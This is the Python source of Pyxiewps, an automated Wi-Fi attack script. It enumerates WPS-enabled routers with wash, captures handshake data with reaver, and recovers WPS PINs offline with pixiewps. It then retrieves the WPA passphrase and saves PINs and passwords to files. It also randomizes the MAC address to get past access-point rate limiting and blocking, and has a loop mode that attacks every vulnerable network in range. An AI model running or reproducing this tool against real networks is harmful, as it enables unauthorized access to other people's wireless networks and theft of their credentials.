from os import kill, system, path, chdir
from signal import alarm, signal, SIGALRM, SIGKILL
import time
import subprocess
from re import sub, compile, search
from sys import argv

REAVER = 'reaver'
PIXIEWPS = 'pixiewps'
WASH = 'wash'
AIRMON = 'airmon-ng'
MACCHANGER = 'macchanger'
GIT = 'git'
INFO = '\033[32m[+] \033[0m'   # green
ALERTA = '\033[31m[!] \033[0m' # red
INPUT = '\033[34m[>] \033[0m'  # blue
DATA = '\033[33m[DATA] \033[0m'  # yellow
OPCION = '\033[33m[!!!] \033[0m' # yellow
USE_REAVER = False   # If False, uses wash and finishes.
USE_PIXIEWPS = False # Tries to get the WPS pin with pixiewps
WASH_TIME = 11       # Time to enumerate the APs with active WPS
WASH_CHANNEL = ''    # All channels
REAVER_TIME = 6      # Time to get all the useful AP information with reaver
CHOICES_YES = ['Y', 'y', '', 'yes', 'Yes']
CHOICES_NOPE = ['N', 'n', 'no', 'No']
PROMPT_APS = False
OUTPUT = False
OUTPUT_FILE = 'data.txt'
PRINT_REAVER = True
PRINT_PIXIE = True
GET_PASSWORD = False
FOREVER = False
OVERRIDE = False

def banner():
  """
  Prints the banner into the screen
  """
  
  print
  print "\t ____             _                         "
  print "\t|  _ \ _   ___  _(_) _____      ___ __  ___ "
  print "\t| |_) | | | \ \/ / |/ _ \ \ /\ / / \'_ \/ __|"
  print "\t|  __/| |_| |>  <| |  __/\ V  V /| |_) \__ \\"
  print "\t|_|    \__, /_/\_\_|\___| \_/\_/ | .__/|___\\"
  print "\t       |___/                     |_|        "
  print
  print "\tMade by jgilhutton <pyxiewps@gmail.com>"
  print "\tReaver 1.5.2 mod by t6_x <t6_x@hotmail.com> & DataHead & Soxrok2212 & Wiire & kib0rg"
  print "\tCopyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>"
  print "\tPixiewps  Copyright (c) 2015, wiire <wi7ire@gmail.com>"
  print "\tMacchanger by Alvaro Ortega Copyright (C) 2003 Free Software Foundation, Inc."
  print
  
def arg_parser():
  """
  Parses the arguments and calls the help() function if any problem is found
  """
 
  global PRINT_PIXIE
  global PRINT_REAVER
  global USE_REAVER
  global USE_PIXIEWPS
  global WASH_TIME
  global REAVER_TIME
  global WASH_CHANNEL
  global PROMPT_APS
  global OUTPUT_FILE
  global OUTPUT
  global GET_PASSWORD
  global FOREVER
  global OVERRIDE
  H = ['-h','--help']
  binary_flags = ['-w','-t','-c','-o']
  
  for arg in argv[1:]:
    if arg in H:
      help()
      exit()
    elif argv[argv.index(arg)-1] in binary_flags:
      continue
    elif arg == '-q' or arg == '--quiet':
      PRINT_PIXIE = False
      PRINT_REAVER = False
    elif arg == '-r' or arg == '--use-reaver':
      USE_REAVER = True
    elif arg == '-p' or arg == '--use-pixie':
      USE_PIXIEWPS = True
    elif arg == '-w' or arg == '--wash-time':
      try:
	WASH_TIME = int(argv[argv.index(arg)+1])
      except ValueError:
	help()
    elif arg == '-t' or arg == '--time':
      try:
	REAVER_TIME = int(argv[argv.index(arg)+1])
      except ValueError:
	help()
    elif arg == '-c' or arg == '--channel':
      try:
	WASH_CHANNEL = int(argv[argv.index(arg)+1])
      except ValueError:
	help()
    elif arg == '-P' or arg == '--prompt':
      PROMPT_APS = True
    elif arg == '-o' or arg == '--output':
      OUTPUT = True
      OUTPUT_FILE = argv[argv.index(arg)+1]
    elif arg == '-f' or arg == '--pass':
      GET_PASSWORD = True
    elif arg == '-F' or arg == '--forever':
      FOREVER = True
    elif arg == '-O' or arg == '--override':
      OVERRIDE = True
    else:
      help()

def help():
  """
  Help information
  """
  
  print
  print "script -r -p -w 15 -t 6 -c 7 -P -o file.txt -f"
  print "script --use-reaver --use-pixie --wash-time 15 --time 6 --channel 7 --prompt --output file.txt -h"
  print
  print '\t-r --use-reaver          Use reaver to get all the AP information.              [False]'
  print '\t-p --use-pixie           Once all the data is captured with reaver              [False]'
  print '\t                         the script tries to get the WPS pin with pixiewps.'
  print '\t-w --wash-time [time]    Set the time used to enumerate all the WPS-active APs. [15]'
  print '\t-t --time [time]         Set the time used to get the hex data from the AP.       [6]'
  print '\t-c --channel [channel]   Set the listening channel to enumerate the WPS-active APs.'
  print '\t                         If not set, all channels are listened.'
  print '\t-P --prompt              If more than one WPS-active AP is found, ask the user [False]'
  print '\t                         the target to attack.'
  print '\t-o --output [file]       Outputs all the data into a file.'
  print '\t-f --pass                If the WPS pin is found, the script uses reaver again to retrieve'
  print '\t                         the WPA password of the AP.'
  print '\t-q --quiet               Doesn\'t print the AP information. Will print the WPS pin and pass if found.'
  print '\t-F --forever             Runs the program on a While loop so the user can scan and attack a hole'
  print '\t                         zone without having to execute the program over and over again.'
  print '\t-O --override            Doesn\'t prompt the user if the WPS pin of the current AP has already'
  print '\t                         been found. DOESN\'T SKIP THE AP, the script attacks it again.'
  print
  exit()
  
class Engine():
  """
  Manage the Config functions and start the program
  """

  def __init__(self):
    self.REAVER = True
    self.PIXIEWPS = True
    self.WASH = True
    self.AIRMON = True
    self.MACCHANGER = True
    self.GIT = True
  
  def start(self):
    """
    Main function
    """
    chdir('/root/')
    if not c.check_iface(): # check_iface returns True if any previous wlan is found in monitor mode
      c.set_iface("UP")
    else:
      print INFO + "Previous interface was found in monitor mode: %s" %c.IFACE_MON
      choice = raw_input("%sDo you wish to use this interface? [Y/n] " %INPUT)
      if choice in CHOICES_YES:
	pass
      elif choice in CHOICES_NOPE:
	c.set_iface("DOWN")
	c.set_iface("UP")
    if FOREVER:
      while True:
	attack = Attack()
	attack.get_wps_aps()
    else:
      attack = Attack()
      attack.get_wps_aps()
      engine.exit_limpio()
    
  def parse_wash(self, linea):
    """
    Parses the wash output
    Returns bssid, channel, essid
    """
    
    linea = linea.split('|')
    bssid = linea[0] # MAC
    canal = linea[1]
    essid = linea[-1]
    return [bssid, canal, essid]
    
  def parse_reaver(self, output, pin_encontrado = False):
    """
    Parses the reaver output
    Gets the pkr, pke, hash1 y 2, enonce, rnonce, authkey, manufacturer y model
    and returns all the data
    """

    if pin_encontrado:
      password = ''
      for linea in output:
	if '[+] WPA PSK: ' in linea:
	  password = sub('\[\+\] WPA PSK: ','',linea)
	  return password
      if password == '':
	return 'no password'

    E_NONCE = ''
    R_NONCE = ''
    PKR = ''
    PKE = ''
    HASH1 = ''
    HASH2 = ''
    AUTHKEY = ''
    MANUFACTURER = ''
    MODEL = ''
    NUMBER = ''
    uberlista = []
    lista_final = []
    is_complete = False
    has_something = False
    
    if output == '':
      return 'shit'
      
    for linea in output:
      if 'E-Nonce' in linea:
	has_something = True
      elif 'E-Hash2' in linea:
	lista_final = output[0:output.index(linea)+1] # Truncates the output after the hash2
	is_complete = True
	break
      elif 'Detected AP rate limiting' in linea:
	return 'ap rate limited'
    if has_something and not is_complete:
      return 'more time please'
    elif has_something == False:
      return 'noutput'
    for linea in lista_final:
      if 'E-Nonce' in linea:
	E_NONCE = sub('\[P\] E-Nonce: ','',linea)
      elif 'R-Nonce' in linea:
	R_NONCE = sub('\[P\] R-Nonce: ','',linea)
      elif 'PKR' in linea:
	PKR = sub('\[P\] PKR: ','',linea)
      elif 'PKE' in linea:
	PKE = sub('\[P\] PKE: ','',linea)
      elif 'E-Hash1' in linea:
	HASH1 = sub('\[P\] E-Hash1: ','',linea)
      elif 'E-Hash2' in linea:
	HASH2 = sub('\[P\] E-Hash2: ','',linea)
      elif 'AuthKey' in linea:
	AUTHKEY = sub('\[P\] AuthKey: ','',linea)
      elif 'Manufacturer' in linea:
	MANUFACTURER = sub('\[P\] WPS Manufacturer: ','',linea)
      elif 'Model Name' in linea:
	MODEL = sub('\[P\] WPS Model Name: ','',linea)
      elif 'Model Number' in linea:
	NUMBER = sub('\[P\] WPS Model Number: ','',linea)
      elif '[+] Associated with ' in linea:
	ESSID = sub('\(ESSID\: ','|',linea)
	ESSID = ESSID.split('|')[-1][:-2]
      elif '[+] Waiting for beacon from ' in linea:
	BSSID = sub('\[\+\] Waiting for beacon from ','',linea)
      else:
	pass
    uberlista = [PKE.strip(),PKR.strip(),HASH1.strip(),HASH2.strip(),AUTHKEY.strip(),
    MANUFACTURER.strip(),MODEL.strip(),NUMBER.strip(),E_NONCE.strip(),R_NONCE.strip(),
    ESSID.strip(),BSSID.strip()]
    return uberlista
  
  def check(self, check_again = False):
    """
    Check dependencies, user ID and other stuff
    """
    
    if c.get_uid() != '0':
      print ALERTA + 'You need to run the script as root'
      exit()

    ### Programas
    if c.program_exists(MACCHANGER):
      self.MACCHANGER = True
    elif not check_again:
      print ALERTA + 'Macchanger is not installed but it isn\'t a key binary.'
      print '    Some APs blocks the attackers device MAC and changing the MAC'
      print '    is a good option to bypass the problem.'
      print '    The script will not change the MAC, so don\'t expect it to work'
      print '    on some APs.'
      self.MACCHANGER = False
    if c.program_exists(REAVER):
      version = c.check_reaver_version()
      if version == '1.5.2':
	self.REAVER = True
      else:
	print ALERTA + "You need other version of reaver."
	self.REAVER = False
    elif not check_again:
      print ALERTA + 'reaver is not installed'
      self.REAVER = False
    if c.program_exists(PIXIEWPS):
      self.PIXIEWPS = True
    elif not check_again:
      print ALERTA + 'pixiewps is not installed'
      self.PIXIEWPS = False
    if c.program_exists(WASH):
      self.WASH = True
    elif not check_again:
      print ALERTA + 'wash is not installed'
      self.WASH = False
    if c.program_exists(AIRMON):
      self.AIRMON = True
    elif not check_again:
      print ALERTA + 'airmon-ng is not installed'
      self.AIRMON = False
    if c.program_exists(GIT):
      self.GIT = True
    elif not check_again:
      self.GIT = False
    if self.REAVER and self.AIRMON and self.WASH and self.PIXIEWPS and check_again:
      print INFO + "All programs were installed!"
      raw_input("%sPress enter to continue" %INPUT)
      print INFO + "Starting the attack..."
    elif check_again:
      print
      print ALERTA + "Some programs were not installed."
      print "    manually check the needed dependencies"
      print "    and run again the program after you installed them."
      print
      exit()
    if self.REAVER and self.AIRMON and self.WASH and self.PIXIEWPS:
      pass
    else:
      print ALERTA + "You need all the necessary programs."
      print INPUT + "They are:"
      print "\tbuild-essential"
      print "\tlibpcap-dev"
      print "\tsqlite3"
      print "\tlibsqlite3-dev"
      print "\taircrack-ng"
      print "\tlibssl-dev"
      choice = raw_input("%sDo you wish to install them now? [Y/n]?" %INPUT)
      if choice in CHOICES_YES:
	c.get_binarios()
      else:
	exit()
    
    ###All good...
    engine.start()

  def run(self, cmd, shell = False, kill_tree = True, timeout = -1):
    """
    Runs a command witha given time after wich is terminated
    returns stdout of proc.
    output is a list without passing strip() on the lines.
    """

    class Alarm(Exception):
      pass
    def alarm_handler(signum, frame):
      raise Alarm
    if timeout != -1:
      signal(SIGALRM, alarm_handler) # Time's ticking...
      alarm(timeout)                 

    proc = subprocess.Popen(cmd, shell = shell, stdout = subprocess.PIPE)
    output = []
    try:
      for line in iter(proc.stdout.readline, ''):
	output.append(line)
      if timeout != -1:
	alarm(0)
    except Alarm:         # time's out! alarm is raised
      pids = [proc.pid]   # kill the process tree related with the main process.
      if kill_tree:
	pids.extend(self.get_process_children(proc.pid))
      for pid in pids:   
	try:             
	  kill(pid, SIGKILL)
	except OSError:
	  pass
      return output
    return output

  def get_process_children(self, pid):
    """
    returns the  pids of the program to kill all the process tree
    """
    
    proc = subprocess.Popen('ps --no-headers -o pid --ppid %d' % pid, shell = True, stdout = subprocess.PIPE)
    stdout = proc.communicate()[0]
    return [int(p) for p in stdout.split()]

  def mac_changer(self):
    """
    Change the device MAC if it's blocked by the AP
    """
    
    print INFO + "Changing MAC address of the device..."
    system('ifconfig %s down' %c.IFACE_MON)
    system('iwconfig %s mode Managed' %c.IFACE_MON)
    system('ifconfig %s up' %c.IFACE_MON)
    system('ifconfig %s down' %c.IFACE_MON)
    mac = subprocess.check_output(['macchanger','-r',c.IFACE_MON])
    mac = mac.split('\n')[2]
    mac = sub('New       MAC\: ','',mac.strip())
    mac = sub(' \(unknown\)','',mac)
    system('ifconfig %s up' %c.IFACE_MON)
    system('ifconfig %s down' %c.IFACE_MON)
    system('iwconfig %s mode monitor' %c.IFACE_MON)
    system('ifconfig %s up' %c.IFACE_MON)
    print INFO + "New MAC: %s%s" %(INPUT,mac.upper())
    
  def exit_limpio(self):
    """
    Clean before quiting
    """
    if path.isfile('/root/pixiewps/Makefile') or path.isfile('/root/reaver-wps-fork-t6x/src/Makefile'):
      print OPCION + "The pixiewps and reaver files are no longer needed"
      print "      and they live in the root home directory,"
      choice = raw_input("%sDo you wish to erase them? [Y/n]" %INPUT)
      if choice in CHOICES_YES:
	system('cd /root && rm -r pixiewps/ && rm -r reaver-wps-fork-t6x/')
    if c.IS_MON:
      c.set_iface("DOWN")
    if USE_REAVER:
      system('rm -f /usr/local/etc/reaver/*.wpc') # Removes the reaver AP session
    exit()

class Config():
  """
  Interface configuration functions and other stuff
  """
  
  IFACE_MON = 'caca'
  IFACE = 'caca'
  IS_MON = False
  
  def program_exists(self, programa):
    """
    Check the program fot its existance
    """

    cmd = "which " + programa
    output = subprocess.Popen(cmd, shell=True, stdout = subprocess.PIPE)
    output = output.communicate()[0]

    if output != "":
      return True    # Exists
    else:
      return False   # Nope

  def get_uid(self):
    """
    Returns the user ID
    """
    
    uid = subprocess.check_output(['id','-u']).strip()
    return uid
  
  def check_iface(self):
    """
    Check for any monitor interfaces already set.
    """
    
    cmd = "ifconfig | grep mon | cut -d \' \' -f1" # iwconfig isn't grepable
    mon = subprocess.check_output(cmd, shell = True).strip()
    if mon != '':
      self.IFACE_MON = mon
      self.IS_MON = True
      return True
    else:
      return False
  
  def get_iface(self):
    """
    If any monitor interfaces are found, returns the wlans.
    If more than onw are found, ask the user to choose.
    If monitor mode is already enable, returns the name.
    """

    if self.IS_MON: # Si la interfaz esta en modo monitor devuelve el nombre 'mon'
      cmd = "ifconfig | grep mon | cut -d \' \' -f1"
      mon = subprocess.check_output(cmd, shell = True).strip()
      self.IFACE_MON = mon
      return mon
    else:
      cmd = "ifconfig | grep wlan | cut -d \' \' -f1"
      proc = subprocess.check_output(cmd, shell = True)
      ifaces = proc.strip().split('\n')

      if len(ifaces) == 1 and ifaces[0] == '':
	print ALERTA + "No wireless interfaces were found!"
	print "    Please check if any wireless device in your PC."
	print "    if you are running on a virtual machine"
	print "    go get an USB wireless device."
	exit()
      elif len(ifaces) > 1:
	print INPUT + "Choose the W.Interface: "
	for i in ifaces:
	  print str(ifaces.index(i)) + " >> " + i
	while True:    #Control the input! you bugseeker!
	  try:
	    choice = int(raw_input(INPUT))
	    if choice <= len(ifaces) and choice >= 0:
	      self.IFACE = ifaces[choice]
	      return ifaces[choice]
	      break
	    else:
	      print INPUT + "Number between 0 and %s" %(len(ifaces)-1) #Index error handling
	  except ValueError:
	    print ALERTA + "NUMBER between 0 and %s" %(len(ifaces)-1) #Integeer error handling
	  except KeyboardInterrupt:
	    print 
	    print ALERTA + "Interrupted program!"
	    print 
	    engine.exit_limpio()
      else:
	self.IFACE = ifaces[0]
	return ifaces[0]
  
  def set_iface(self, status):
    """
    Wireless interface driver. Puts it on monitor mode 
    and puts it back on normal mode.
    "status" variable is used only for the sake of readability and it's based
    on the "self.IS_MON" boolean
    """   
    
    if self.IS_MON:
      cmd = 'airmon-ng stop ' + self.get_iface()
      print INFO + 'Restoring %s wireless interface...' %self.IFACE_MON
      proc = subprocess.call(cmd, shell = True, stdout = subprocess.PIPE)
      self.IS_MON = False
      print INFO + 'Done'
    else:
      cmd = 'airmon-ng start ' + self.get_iface()
      print INFO + 'Enabling monitor mode...'
      proc = subprocess.call(cmd, shell = True, stdout = subprocess.PIPE)
      self.check_iface()
      print INFO + "Monitor mode enabled on %s" %self.IFACE
      
  def data_file(self, data):
    """
    Outputs the data into a file
    """
    system('echo DATA >> %s' %OUTPUT_FILE)
    with open(OUTPUT_FILE, 'a+') as f:
      fecha = str(time.gmtime()[1])+'-'+str(time.gmtime()[2])+'-'+str(time.gmtime()[0])
      hora = str((time.gmtime()[3])-3).zfill(2)+':'+str(time.gmtime()[4]).zfill(2)
      f.write(fecha+' | '+hora+'\n')
      f.writelines(data)
    print INFO + "All data were saved into %s" %OUTPUT_FILE
    
  def get_binarios(self):
    """
    Installs reaver, pixiewps and other stuff
    """
    
    git = 'apt-get -y install git'
    reaver_dep = 'apt-get -y install build-essential libpcap-dev sqlite3 libsqlite3-dev aircrack-ng'
    pixie_dep = 'sudo apt-get -y install libssl-dev'
    reaver = 'git clone https://github.com/t6x/reaver-wps-fork-t6x.git'
    pixiewps = 'git clone https://github.com/wiire/pixiewps.git'
    aircrack = 'apt-get -y install aircrack-ng'
    if not engine.GIT:
      print INFO + "Installing git..."
      proc4 = system(git)
    if not engine.AIRMON:
      print INFO + "Installing aircrack..."
      proc5 = system(aircrack)
    if not engine.PIXIEWPS:
      print INFO + "Installing pixiewps dependencies..."
      proc2 = system(pixie_dep)
      print INFO + "Downloading pixiewps..."
      proc3 = system(pixiewps)    
    if not engine.REAVER:
      print INFO + "Installing reaver dependencies..."
      proc = system(reaver_dep)
      print INFO + "Downloading reaver..."
      proc1 = system(reaver)
    if path.isdir('pixiewps') and not engine.PIXIEWPS:
      print INFO + "Installing pixiewps..."
      system('cd pixiewps/src && make && make install')
      print INFO + "Done"
    if path.isdir('reaver-wps-fork-t6x') and not engine.REAVER:
      print INFO + "Installing reaver..."
      system('cd reaver-wps-fork-t6x* && cd src && ./configure && make && make install')
      print INFO + "Done"
    engine.check(check_again = True)

  def check_reaver_version(self):
    """
    Returns reaver version if it's installed
    """
    
    output = subprocess.Popen('reaver -h', shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
    output = output.communicate()
    if 'Reaver v1.5.2 WiFi Protected Setup Attack Tool' in output[0] and 'mod by t6_x' in output[0]:
      return '1.5.2'
    elif output[0] != '':
      return output[0][9:12]
    elif 'Reaver v1.5.2 WiFi Protected Setup Attack Tool' in output[1] and 'mod by t6_x' in output[1]:
      return '1.5.2'
    elif output[1] != '':
      return output[1][9:12]

class Attack():
  """
  Attack functions
  """
  
  def get_wps_aps(self):
    """
    Enumerates any WPS-active APs
    Goes to get_reaver_info
    """

    print INFO + "Enumerating WPS-active APs..."
    cmd = 'wash -i %s -P' %(c.IFACE_MON)
    if WASH_CHANNEL != '':
      cmd = cmd + ' -c %d' %WASH_CHANNEL
    lista_aps = engine.run(cmd, shell = True, timeout = WASH_TIME)
    lista_provisoria = []
    ultimo = len(lista_aps)-1
    for linea in lista_aps:             # Some wash output glitches are often found
      if '|' in linea:                  # this handles theese glitches
	lista_provisoria.append(linea)  #
    lista_aps = lista_provisoria        #
    if lista_aps == []:
      print
      print ALERTA + "No WPS-active APs were found."
      print
      if not FOREVER:
	engine.exit_limpio()
    else:
      for_fill = lista_aps                                              #\
      essids = []                                                       #|
      for line in for_fill:                                             #|- Formats the list
	line = line.split('|')                                          #|
	essids.append(line[5].strip())                                  #|
      fill = len(max(essids))                                           #/
      print INFO + "The following WPS-active APs were found:"
      for linea in lista_aps:
	linea = linea.split('|')
	fill_line = fill - len(linea[5].strip())
	print '\t' + INPUT + str(linea[5].strip()) + ' '*fill_line + ' || ' + linea[0] + ' || Channel: ' + linea[1] + ' || WPS locked?: ' + linea[4]
      if USE_REAVER:
	while True:
	  try:
	    if len(lista_aps) != 1 and PROMPT_APS: 
	      choice = int(raw_input("%sIndex of the AP: " %INPUT))
	      provisoria = []
	      provisoria.append(lista_aps[choice])
	      lista_aps = provisoria
	      break
	    else:
	      break
	  except KeyboardInterrupt:
	    print
	    engine.exit_limpio()
	    break
	  except ValueError:
	    print ALERTA + "Number between 0 and %d" %ultimo
	if not OVERRIDE and path.isfile('pyxiewpsdata.txt'):
	  coincidencias = []
	  pin_correspondiente = []
	  with open('pyxiewpsdata.txt') as f:
	    ya_sacados = f.readlines()
	  if len(ya_sacados) > 1:
	    ya_sacados.reverse() # reverts the list so it takes the newest pin
	    for target in lista_aps: # if any pin were changed by the AP administrator
	      for line in ya_sacados[1:]:
		if target.split('|')[5].strip() == line.strip():
		  coincidencias.append(target)
		  pin_correspondiente.append(ya_sacados[ya_sacados.index(line)-1].strip())
	    for i in set(coincidencias):
	      print OPCION + "The %s pin was already found!" %i.split('|')[5].strip()
	      print '\t'+ INPUT + pin_correspondiente[coincidencias.index(i)]
	      print OPCION + "Do you want to skip this AP? [Y/n]: "
	      try:
		choice = raw_input("%s Enter to skip: " %INPUT)
	      except KeyboardInterrupt:
		print
		engine.exit_limpio()
	      if choice in CHOICES_YES:
		lista_aps.remove(i)
	for linea in lista_aps:
	  args = engine.parse_wash(linea.strip())
	  self.get_reaver_info(args[0],args[1],args[2])
	if not FOREVER:
	  engine.exit_limpio()
	else:
	  pass
  
  def get_reaver_info(self, bssid, canal, essid):
    """
    Gets all the vital information from the AP
    PKR, PKE, HASH1, HASH2, AUTHKEY
    it's in the get_wps_aps for-loop
    """

    print INFO + "Fetching information from %s using reaver..." %essid
    output = engine.run(cmd=['reaver','-i',c.IFACE_MON,'-b',bssid,'-vvv','-L','-c',canal], timeout = REAVER_TIME)
    data = engine.parse_reaver(output)
    if data == 'noutput':
      print
      print ALERTA + "Couldn\'t retrieve any information from the AP."
      print ALERTA + "Try with a greater time using the -t argument"
      print "    and if it doesn\'t work out try to get a better signal."
      print
      if MACCHANGER and FOREVER:
	engine.mac_changer()
      elif MACCHANGER and not FOREVER:
	print ALERTA + "MAC address will not be changed because this is running only once."
	print "    Run the program for ever by typing the -F argument in the commandline."
	print
      elif not MACCHANGER:
	print ALERTA + "Can not change the MAC address"
	print "    because macchanger is not installed."
	print
    elif data == 'more time please':
      print
      print ALERTA + "The program retrieved some information from the AP but"
      print "    not all of it. Set a greater time to fetch the information"
      print "    with the -t argument. 6 seconds by default"
      print
    elif data == 'ap rate limited':
      print
      print ALERTA + "The AP doesn\'t like you!"
      print "    That\'s why reaver couldn\'t retrieve any information"
      print
      if MACCHANGER and FOREVER:
	engine.mac_changer()
      elif MACCHANGER and not FOREVER:
	print ALERTA + "MAC address will not be changed because this is running only once."
	print "    Run the program for ever by typing the -F argument in the commandline."
	print
      elif not MACCHANGER:
	print ALERTA + "Can not change the MAC address"
	print "    because macchanger is not installed."
	print
    elif data == 'shit':
      print
      print "Choose a reaver session option when asked for it."
      if not FOREVER:
	engine.exit_limpio()
    else:
      print INFO + "Success!. All the needed information were found"
      for_file = ['ESSID: ' + data[10] + '\n','MAC: ' + data[11] + '\n','PKE: ' + data[0] + '\n',
      'PKR: ' + data[1] + '\n','HASH1: ' + data[2] + '\n','HASH2: ' + data[3] + '\n',
      'E-NONCE: ' + data[8] + '\n','R-NONCE: ' + data[9] + '\n','AUTHKEY: ' + data[4] + '\n',
      'MANUFACTURER: ' + data[5] + '\n','MODEL: ' + data[6] + '\n','MODEL NUMBER: ' + data[7] + '\n']
      if PRINT_REAVER:
	print
	for linea in for_file:
	  print DATA + linea.strip()
	print
      if OUTPUT and not USE_PIXIEWPS:
	for_file.append('-'*40+'\n')
	c.data_file(for_file)
      if USE_PIXIEWPS:
	self.pixie_attack(data,for_file,canal)

  def pixie_attack(self,data,for_file,canal):
    """
    Tries to find the WPS pin using pixiewps
    """
    
    ESSID = data[10]
    BSSID = data[11]
    PKE = data[0]
    PKR = data[1]
    HASH1 = data[2]
    HASH2 = data[3]
    AUTHKEY = data[4]
    E_NONCE = data[8]
    R_NONCE = data[9]
    
    cmd = ['pixiewps','-e',PKE,'-r',PKR,'-s',HASH1,'-z',HASH2,'-a',AUTHKEY,'-n',E_NONCE]
    cmd1 = ['pixiewps','-e',PKE,'-s',HASH1,'-z',HASH2,'-a',AUTHKEY,'-n',E_NONCE,'-S']
    cmd2 = ['pixiewps','-e',PKE,'-s',HASH1,'-z',HASH2,'-n',E_NONCE,'-m',R_NONCE,'-b',BSSID,'-S']
    pin = ''
    cmd_list = [cmd, cmd1, cmd2]
    output = []
    for command in cmd_list:
      try:
	output = subprocess.check_output(command)
	output = output.strip().split('\n')
	for linea in output:
	  if '[+] WPS pin:' in linea:
	    result = compile('\d+')
	    pin = result.search(linea).group(0)
	    break
	  else:
	    pass
      except:             #Pixiewps error handling
	pass
      if pin != '': break
    if pin != '' and len(pin) == 8:
      print INFO + "WPS pin found!"
      print "\t" + INPUT + pin
      for_file.append('WPS pin: '+pin+'\n')
      system('echo >> pyxiewpsdata.txt')
      with open('pyxiewpsdata.txt','a+') as f:
	f.write(ESSID+'\n')
	f.write(pin)
    elif pin == '':
      print
      print ALERTA + "WPS pin was not found."
      print "    Probably, the AP is not vulnerable to this attack"
      print "    and never will. Move on."
      print
      
    if GET_PASSWORD and pin != '':
      self.get_password(for_file, BSSID, pin, canal)
    elif OUTPUT:
      for_file.append('-'*40+'\n')
      c.data_file(for_file)
  
  def get_password(self, for_file, BSSID, pin, canal):
    """
    Once the WPS pin was found, ries to get the password.
    """
    
    output = engine.run(cmd=['reaver','-i',c.IFACE_MON,'-b',BSSID,'-c',canal,'-p',pin,'-L'], timeout = (REAVER_TIME+4))
    password = engine.parse_reaver(output, pin_encontrado = True)
    if password == 'no password':
      print
      print ALERTA + "Can't get the password right now but you can"
      print "    use the WPS pin to access the wireless network."
      print
    else:
      print INFO + "Password found!"
      print '\t' + INPUT + password.strip()
    if OUTPUT:
      for_file.append('Password: ' + password + '\n'+'-'*40+'\n')
      c.data_file(for_file)

if __name__ == '__main__':
  arg_parser()
  banner()
  try:
    c = Config()
    engine = Engine()
    engine.check()
  except KeyboardInterrupt, EOFError:
    print
    print ALERTA + "Interrupted program!"
    print    
    engine.exit_limpio()
